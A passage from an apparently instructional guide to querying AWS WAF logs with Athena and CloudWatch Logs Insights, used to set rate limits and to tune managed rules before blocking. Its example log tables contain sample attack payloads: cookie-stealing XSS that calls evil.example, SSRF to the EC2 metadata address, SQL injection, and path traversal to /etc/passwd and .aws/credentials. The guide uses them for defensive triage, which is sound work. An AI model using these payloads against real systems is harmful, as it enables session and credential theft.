SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    bin(5m) as binTime,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    webaclId,
    action
    | filter action = "ALLOW"
    | stats count(*) as request_count by clientIp, webaclId, binTime
    | sort request_count desc
    | limit 100
```

**Example output**

| time_bucket | request_count | clientIp | country | webaclid |
|-------------|---------------|----------|---------|----------|
| | | | | |

**How to read these results**



#### Composite key: source IP + hostname

This query aggregates by source IP and the host header — another way to break down traffic per application, similar to the protection pack ARN approach above. In some cases these achieve the same thing (one protection pack per application); in others the hostname gives you finer granularity (multiple hostnames behind a single protection pack) or the protection pack gives you better coverage (multiple hostnames that should be treated as one application). Neither is better or worse — they are options depending on your architecture. You can use the results to create different rate limit buckets for different use cases — an API endpoint might tolerate a much higher threshold than a static marketing site. This is also useful for application teams who need to understand their own traffic patterns when multiple applications share infrastructure behind a single protection pack.

**Athena**
```sql
SELECT
    date_trunc('minute', from_unixtime(timestamp / 1000)) AS time_bucket,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value AS host,
    count(*) AS request_count
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND action = 'ALLOW'
GROUP BY
    date_trunc('minute', from_unixtime(timestamp / 1000)),
    httprequest.clientip,
    httprequest.country,
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value
ORDER BY request_count DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    bin(5m) as binTime,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    httpRequest.host as host,
    action
    | filter action = "ALLOW"
    | stats count(*) as request_count by clientIp, host, binTime
    | sort request_count desc
    | limit 100
```

**Example output**

| time_bucket | clientIp | country | host | request_count |
|-------------|----------|---------|------|---------------|
| 2026-07-26 14:35:00.000 | 192.0.2.17 | US | api.example.com | 8,742 |
| 2026-07-28 03:10:00.000 | 203.0.113.44 | US | api.example.com | 7,219 |
| 2026-07-25 22:50:00.000 | 192.51.100.88 | US | www.example.com | 6,531 |
| 2026-07-27 09:05:00.000 | 192.0.2.203 | US | api.example.com | 5,104 |
| 2026-07-29 16:20:00.000 | 203.0.113.12 | US | api.example.com | 548 |
| 2026-07-26 08:45:00.000 | 192.51.100.34 | US | www.example.com | 543 |
| 2026-07-30 11:30:00.000 | 192.0.2.91 | US | app.example.com | 539 |
| 2026-07-25 19:15:00.000 | 203.0.113.77 | US | api.example.com | 536 |
| 2026-07-28 07:40:00.000 | 192.51.100.142 | US | www.example.com | 531 |
| 2026-07-27 13:55:00.000 | 192.0.2.56 | US | app.example.com | 528 |
| 2026-07-29 22:10:00.000 | 203.0.113.201 | US | api.example.com | 525 |
| 2026-07-26 04:25:00.000 | 192.51.100.7 | US | www.example.com | 522 |
| 2026-07-30 09:50:00.000 | 192.0.2.164 | US | app.example.com | 519 |
| 2026-07-25 15:05:00.000 | 203.0.113.158 | US | api.example.com | 517 |
| 2026-07-28 20:30:00.000 | 192.51.100.219 | US | www.example.com | 514 |
| 2026-07-27 06:15:00.000 | 192.0.2.38 | US | app.example.com | 511 |
| 2026-07-29 12:40:00.000 | 203.0.113.93 | US | api.example.com | 509 |
| 2026-07-26 18:00:00.000 | 192.51.100.61 | US | www.example.com | 506 |
| 2026-07-30 01:25:00.000 | 192.0.2.127 | US | app.example.com | 503 |
| 2026-07-25 10:50:00.000 | 203.0.113.180 | US | api.example.com | 501 |



**How to read these results**



### Evaluating AWS Managed Rules before switching from Count to Block

When you first add an AWS Managed Rule group to your protection pack, the recommended practice is to set it to Count mode so you can observe what it would have blocked without impacting production traffic. The queries below help you evaluate whether a rule group is safe to switch to Block by showing you exactly what traffic is matching.

The examples use the Core Rule Set (CRS) but the approach is identical for any AWS Managed Rule — just replace the label prefix. Every AMR emits labels when it matches a request, and those labels appear in WAF logs regardless of whether the rule is in Count or Block mode. This means you can evaluate potential impact before enforcing.

#### Count of rule group matches by endpoint, URI, and HTTP method

This query shows which combinations of host, URI, query string, and HTTP method are triggering any rule in the Core Rule Set, along with how frequently. Use this to quickly identify if the matches are concentrated on a few endpoints (likely legitimate application behavior that needs an exception) or spread broadly across many paths (likely actual attack traffic that is safe to block).  Either way, this first query gives you data to dive into specific rules and/or hosts/applications that need deeper inspection.  

**Athena**
```sql
SELECT
    count(*) AS match_count,
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:core-rule-set:%'), 1).name, ':'), -1) AS coreRuleSet,
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value AS host,
    httprequest.uri AS uri,
    httprequest.httpmethod AS httpMethod,
    httprequest.args AS args
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND cardinality(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:core-rule-set:%')) > 0
GROUP BY
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value,
    httprequest.uri,
    httprequest.args,
    httprequest.httpmethod,
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:core-rule-set:%'), 1).name, ':'), -1)
ORDER BY match_count DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    httpRequest.host as host,
    httpRequest.uri as uri,
    httpRequest.args as args,
    httpRequest.httpMethod as httpMethod,
    action
    | parse @message /\"name\":\s*\"awswaf:managed:aws:core-rule-set:(?<coreRuleSet>[^"]*)\"/
    | filter ispresent(coreRuleSet)
    | stats count(*) as match_count by host, uri, args, httpMethod, coreRuleSet
    | display count(*), coreRuleSet, host, uri, httpMethod, args
    | sort match_count desc
    | limit 100
```

**Example output**

| match_count | coreRuleSet | host | uri | httpMethod | args |
|-------------|-------------|------|-----|------------|------|
| 47 | CrossSiteScripting_BODY | app.example.com | /api/v2/comments | POST | |
| 27 | CrossSiteScripting_BODY | app.example.com | /api/v2/feedback | POST | |
| 14 | CrossSiteScripting_BODY | app.example.com | /api/v2/notes | POST | |
| 8 | CrossSiteScripting_BODY | app.example.com | /api/v2/tickets | POST | |
| 10 | CrossSiteScripting_BODY | www.example.com | /contact | POST | |
| 18 | CrossSiteScripting_QUERYARGUMENTS | www.example.com | /search | GET | q=&lt;img/src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)&gt; |
| 17 | CrossSiteScripting_QUERYARGUMENTS | www.example.com | /search | GET | searchString=how+do+I+use+%3Cscript%3E+tags+in+HTML&category=webdev |
| 34 | RestrictedExtensions_URIPath | api.example.com | /access.log | GET | |
| 11 | RestrictedExtensions_URIPath | api.example.com | /admin_access.txt.bak | GET | |
| 14 | RestrictedExtensions_URIPath | api.example.com | /mysql_access.log | GET | |
| 9 | RestrictedExtensions_URIPath | api.example.com | /root_access.log | GET | |
| 16 | RestrictedExtensions_URIPath | api.example.com | /ssh_access.txt.bak | GET | |
| 24 | RestrictedExtensions_URIPath | api.example.com | /web.config | GET | |
| 13 | RestrictedExtensions_URIPath | www.example.com | /config.ini | GET | |
| 19 | RestrictedExtensions_URIPath | www.example.com | /database_access.log | GET | |
| 7 | RestrictedExtensions_URIPath | www.example.com | /web-access.txt.bak | GET | |
| 12 | SizeRestrictions_BODY | app.example.com | /api/v2/attachments | POST | |
| 15 | SizeRestrictions_BODY | app.example.com | /api/v2/bulk-import | POST | |
| 21 | SizeRestrictions_BODY | app.example.com | /api/v2/documents/upload | POST | |
| 9 | SizeRestrictions_BODY | app.example.com | /api/v2/profile/avatar | POST | |
| 7 | SizeRestrictions_BODY | app.example.com | /api/v2/reports/export | POST | |

**How to read these results**

By sorting by rule label, then host, then URI, patterns become immediately visible. `CrossSiteScripting_BODY` is triggering across multiple API endpoints on `app.example.com` — these could be legitimate user-submitted content (rich text, code snippets) or actual XSS payloads embedded in POST bodies. A good follow-up would be adding `terminatingrulematchdetails` to a focused query on these endpoints to see exactly what string pattern is matching. `CrossSiteScripting_QUERYARGUMENTS` on `www.example.com/search` shows both a clearly malicious payload (the `onerror=fetch(...)` exfiltration attempt) and a legitimate user searching for how to use `<script>` tags — the same rule, same endpoint, but one should be blocked and the other would require a scoped exception. `RestrictedExtensions_URIPath` matches are all probing for sensitive files like `/access.log`, `/web.config`, and `.txt.bak` — this is noise from scanners and is safe to block without further review. `SizeRestrictions_BODY` is triggering on upload and import endpoints that very likely need to accept large payloads as part of normal application behavior — these are worth further exploration and will likely require exceptions scoped to those specific paths.

#### Individual requests matching a specific rule label

Once the summary query identifies which rule label is triggering, use this query to inspect the actual requests matching that specific rule. This gives you the detail needed to determine whether matches are legitimate application traffic (false positive) or actual malicious requests. Replace `EC2MetaDataSSRF_QUERYARGUMENTS` with the specific rule label you are investigating.  You might need to add more or custom columns, the query below has the common ones thats directly align with what AMRs inspect (i.e. query string, uri, etc).  You will likely run a version of this query per application or per rule and drill in yourself or provide context to an application team to understand if something is going to be a false positive or noise that is OK to block in the future.  

**Athena**
```sql
SELECT
    from_unixtime(timestamp / 1000) AS log_time,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value AS host,
    httprequest.uri AS uri,
    -- Useful when the rule in question evaluates the query string.
    -- httprequest.args AS args,
    -- For rules that inspect the body, this shows you the matching component from the body as the full body is not available in WAF logs intentionally
    -- nonTerminatingMatchingRules,
    httprequest.httpmethod AS httpMethod,
    action,
    terminatingruleid
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND cardinality(filter(labels, l -> l.name = 'awswaf:managed:aws:core-rule-set:CrossSiteScripting_BODY')) > 0
ORDER BY timestamp DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    httpRequest.host as host,
    httpRequest.uri as uri,
    #httpRequest.args as args,
    #nonTerminatingMatchingRules,
    httpRequest.httpMethod as httpMethod,
    action,
    terminatingRuleId
    | filter strcontains(@message, "awswaf:managed:aws:core-rule-set:CrossSiteScripting_BODY")
    | sort @timestamp desc
    | limit 100
```

**Example output**

| log_time | clientIp | country | host | uri | httpMethod | action | terminatingruleid | nonTerminatingMatchingRules (matchedData) |
|----------|----------|---------|------|-----|------------|--------|-------------------|-------------------------------------------|
| 2026-07-30 14:18:07.000 | 203.0.113.92 | US | app.example.com | /api/v2/comments | POST | ALLOW | Default_Action | &lt;p style="color:red"&gt;URGENT&lt;/p&gt;&lt;img src="https://app.example.com/screenshots/error-412.png" alt="error screenshot"&gt; |
| 2026-07-30 13:41:19.000 | 192.0.2.156 | CA | app.example.com | /api/v2/comments | POST | ALLOW | Default_Action | &lt;table&gt;&lt;tr&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Status&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; |
| 2026-07-30 12:44:38.000 | 192.0.2.88 | US | app.example.com | /api/v2/comments | POST | ALLOW | Default_Action | &lt;img src=x onerror=fetch('https://evil.example/c='+document.cookie)&gt; |
| 2026-07-30 12:59:03.000 | 192.51.100.203 | US | app.example.com | /api/v2/feedback | POST | ALLOW | Default_Action | &lt;a href="https://docs.example.com"&gt;see docs&lt;/a&gt; |
| 2026-07-30 14:22:31.000 | 192.0.2.41 | US | app.example.com | /api/v2/feedback | POST | ALLOW | Default_Action | &lt;script&gt;new Image().src='https://evil.example/steal?c='+document.cookie&lt;/script&gt; |
| 2026-07-30 13:55:42.000 | 192.51.100.18 | US | app.example.com | /api/v2/feedback | POST | ALLOW | Default_Action | &lt;iframe src=//evil.example/phish&gt; |
| 2026-07-30 12:15:44.000 | 192.51.100.67 | US | app.example.com | /api/v2/feedback | POST | ALLOW | Default_Action | &lt;div onmouseover=alert(document.cookie)&gt;click me&lt;/div&gt; |
| 2026-07-30 11:58:22.000 | 192.0.2.214 | US | app.example.com | /api/v2/notes | POST | ALLOW | Default_Action | &lt;blockquote&gt;Per the design doc&lt;/blockquote&gt;&lt;p&gt;I disagree — see &lt;a href="/wiki/RFC-42"&gt;RFC-42&lt;/a&gt;&lt;/p&gt; |
| 2026-07-30 12:31:10.000 | 203.0.113.145 | US | app.example.com | /api/v2/tickets | POST | ALLOW | Default_Action | &lt;div class="note"&gt;&lt;h3&gt;Steps to Reproduce&lt;/h3&gt;&lt;ol&gt;&lt;li&gt;Click submit&lt;/li&gt;&lt;li&gt;Page hangs&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; |
| 2026-07-30 13:28:55.000 | 203.0.113.27 | US | app.example.com | /api/v2/tickets | POST | ALLOW | Default_Action | &lt;svg/onload=fetch('https://evil.example/exfil')&gt; |

**How to read these results**

The `nonTerminatingMatchingRules (matchedData)` column reveals why each request triggered the rule. Sorted by URI, a clear pattern emerges: on `/api/v2/comments`, `/api/v2/feedback`, and `/api/v2/tickets`, you can see both legitimate rich-text content (embedded images with `src=`, tables, links, structured HTML) alongside obvious attack payloads referencing `evil.example` with event handlers like `onerror`, `onmouseover`, and `onload`. The legitimate requests are users submitting formatted content through a rich-text editor — these endpoints need a scoped exception for `CrossSiteScripting_BODY`. The malicious requests should still be caught, which means you would not simply disable the rule entirely but instead build a targeted exception that excludes specific URIs while keeping the rule enforced everywhere else. This is exactly the kind of insight that informs the exception design covered in the next section.

#### Requests matching a rule label with secondary signal filtering (likely false positives)

This is the same detail query as above but adds Anonymous IP List and Amazon IP Reputation List labels as additional columns, then filters to only show requests that triggered a Core Rule Set label but did *not* trigger either reputation-based rule group. The logic: if a request has no anonymous IP signal and no IP reputation signal but is still triggering CRS, it is more likely to be legitimate application traffic producing a false positive rather than malicious noise. At scale — dozens, hundreds, or more applications — this type if filtering can  dramatically reduces what you need to manually review by excluding the traffic that is almost certainly attack-related (bad reputation, anonymous infrastructure) and surfacing the traffic that actually needs human judgment.  Using those AMRs is a good idea, but this is also a good concept you can use other signals.  For example, you might restrict to only check traffic from specific countries as anything else is likely noise.  

**Athena**
```sql
SELECT
    from_unixtime(timestamp / 1000) AS log_time,
    httprequest.clientip AS clientIp,
    httprequest.country AS country,
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'host'), 1).value AS host,
    httprequest.uri AS uri,
    httprequest.args AS args,
    httprequest.httpmethod AS httpMethod,
    element_at(filter(httprequest.headers, h -> lower(h.name) = 'user-agent'), 1).value AS userAgent,
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:core-rule-set:%'), 1).name, ':'), -1) AS coreRuleSet,
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:anonymous-ip-list:%'), 1).name, ':'), -1) AS anonymousIpList,
    element_at(split(element_at(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:amazon-ip-list:%'), 1).name, ':'), -1) AS amazonIpList,
    action,
    terminatingruleid
FROM waf_logs
WHERE
    timestamp >= to_unixtime(current_timestamp - interval '7' day) * 1000
    AND cardinality(filter(labels, l -> l.name = 'awswaf:managed:aws:core-rule-set:EC2MetaDataSSRF_QUERYARGUMENTS')) > 0
    -- Exclude requests that also triggered reputation-based rules (likely malicious, not FP)
    AND cardinality(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:anonymous-ip-list:%')) = 0
    AND cardinality(filter(labels, l -> l.name LIKE 'awswaf:managed:aws:amazon-ip-list:%')) = 0
ORDER BY timestamp DESC
LIMIT 100
```

**CloudWatch Log Insights**
```
SOURCE "<arn:aws:logs:us-east-1:111111111111:log-group:aws-waf-logs-<log_group_name>" START=-604800s END=0s |
    fields @timestamp,
    httpRequest.clientIp as clientIp,
    httpRequest.country as country,
    httpRequest.host as host,
    httpRequest.uri as uri,
    httpRequest.args as args,
    httpRequest.httpMethod as httpMethod,
    action,
    terminatingRuleId
    | parse @message /\"name\":\s*\"User-Agent\",\s*\"value\":\s*\"(?<userAgent>[^"]*)\"/
    | parse @message /\"name\":\s*\"awswaf:managed:aws:core-rule-set:(?<coreRuleSet>[^"]*)\"/
    | parse @message /\"name\":\s*\"awswaf:managed:aws:anonymous-ip-list:(?<anonymousIpList>[^"]*)\"/
    | parse @message /\"name\":\s*\"awswaf:managed:aws:amazon-ip-list:(?<amazonIpList>[^"]*)\"/
    | filter strcontains(@message, "awswaf:managed:aws:core-rule-set:EC2MetaDataSSRF_QUERYARGUMENTS")
    | filter not ispresent(anonymousIpList)
    | filter not ispresent(amazonIpList)
    | sort @timestamp desc
    | limit 100
```

**Example output**

| log_time | clientIp | country | host | uri | args | httpMethod | userAgent | coreRuleSet | anonymousIpList | amazonIpList | action | terminatingruleid |
|----------|----------|---------|------|-----|------|------------|-----------|-------------|-----------------|--------------|--------|-------------------|
| 2026-07-31 18:47:00.000 | 192.0.2.41 | US | api.example.com | /api/proxy | url=http://169.254.169.254/latest/meta-data/iam | GET | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 | EC2MetaDataSSRF_QUERYARGUMENTS | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 18:20:59.000 | 203.0.113.92 | US | www.example.com | /redirect | target=http://169.254.169.254/latest/api/token | GET | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 | EC2MetaDataSSRF_QUERYARGUMENTS | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 17:56:55.000 | 192.0.2.156 | US | app.example.com | /api/v2/reports | filter=status='active'+OR+status='pending' | GET | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 | SQLi_QUERYARGUMENTS | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 17:44:35.000 | 203.0.113.27 | US | www.example.com | /search | q=1+UNION+SELECT+password+FROM+users-- | GET | Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0 | SQLi_QUERYARGUMENTS | | | ALLOW | Default_Action |
| 2026-07-31 17:44:21.000 | 192.0.2.88 | US | api.example.com | /api/v2/comments | | POST | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 | CrossSiteScripting_BODY | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 17:43:06.000 | 192.51.100.203 | US | app.example.com | /api/v2/feedback | | POST | Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 | CrossSiteScripting_BODY | | | ALLOW | Default_Action |
| 2026-07-31 17:40:00.000 | 203.0.113.145 | US | www.example.com | /docs/export | format=pdf&template=../shared/header | GET | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 | GenericLFI_QueryArguments | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 15:15:12.000 | 192.0.2.127 | JP | www.example.com | /products | id=1;+DROP+TABLE+orders;-- | GET | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 | SQLi_QUERYARGUMENTS | | | ALLOW | Default_Action |
| 2026-07-31 18:09:36.000 | 192.51.100.18 | US | www.example.com | /app/../../.aws/credentials | | GET | Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 | GenericLFI_URIPath | AnonymousIPList | | ALLOW | Default_Action |
| 2026-07-31 15:33:20.000 | 192.51.100.67 | CN | api.example.com | /index.php | lang=../../../../../../../../tmp/index1 | GET | libredtail-http | GenericLFI_QueryArguments | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 15:33:18.000 | 192.51.100.67 | CN | api.example.com | /index.php | lang=../../../../../../../../etc/passwd | GET | libredtail-http | GenericLFI_QueryArguments | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 15:21:40.000 | 203.0.113.77 | IN | 127.0.0.1 | /GponForm/diag_Form | | POST | Hello, World | GenericRFI_Body | HostingProviderIPList | AWSManagedIPReputationList | ALLOW | Default_Action |
| 2026-07-31 17:37:57.000 | 192.0.2.214 | NL | www.example.com | / | | GET | | NoUserAgent_Header | AnonymousIPList | AWSManagedIPReputationList | ALLOW | Default_Action |
| 2026-07-31 16:15:15.000 | 192.0.2.214 | NL | www.example.com | / | | GET | | NoUserAgent_Header | AnonymousIPList | AWSManagedIPReputationList | ALLOW | Default_Action |
| 2026-07-31 17:29:01.000 | 203.0.113.58 | PK | | /boaform/admin/formLogin | q=admin | GET | | NoUserAgent_Header | HostingProviderIPList | | ALLOW | Default_Action |
| 2026-07-31 18:09:34.000 | 192.51.100.18 | US | www.example.com | /.env.backup | | GET | Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 | RestrictedExtensions_URIPath | AnonymousIPList | | ALLOW | Default_Action |
| 2026-07-31 18:09:34.000 | 192.51.100.18 | US | www.example.com | /.env.bak | | GET | Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 | RestrictedExtensions_URIPath | AnonymousIPList | | ALLOW | Default_Action |
| 2026-07-31 18:09:34.000 | 192.51.100.18 | US | www.example.com | /.env.bak | | GET | Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 | RestrictedExtensions_URIPath | AnonymousIPList | | ALLOW | Default_Action |
| 2026-07-31 18:09:34.000 | 192.51.100.18 | US | www.example.com | /.env.ini | | GET | Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 | RestrictedExtensions_URIPath | AnonymousIPList | | ALLOW | Default_Action |
| 2026-07-31 18:09:36.000 | 192.51.100.18 | US | www.example.com | /wp-config.php.bak | | GET | Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 | RestrictedExtensions_URIPath | AnonymousIPList | | ALLOW | Default_Action |


**How to read these results**

The `anonymousIpList` and `amazonIpList` columns add a secondary signal that helps you triage ambiguous matches. Many of these CRS triggers are not obviously malicious from the URI or query string alone — they could be legitimate application behavior. When you see `HostingProviderIPList`, `AnonymousIPList`, or `AWSManagedIPReputationList` alongside the match, that additional context — combined with the triggering rule and the application in question — helps you assess whether the request warrants concern. A hosting provider IP is not automatically malicious — many legitimate services and integrations operate from cloud infrastructure. But if your application's expected audience is end users browsing from residential or corporate IPs, a request from a hosting provider that also triggers a CRS rule is much less likely to be legitimate traffic. Requests with those labels are far more likely to be noise than legitimate traffic worth investigating further. Rows without any reputation signal are the ones that actually need your attention — those are where you need to determine if the match is a false positive or a real attack from a clean source. This example shows 20 rows, but in production you might have dozens or hundreds of matches. Filtering out the easy ones like this reduces how many of the most difficult-to-classify requests you need to manually review or delegate to application teams.


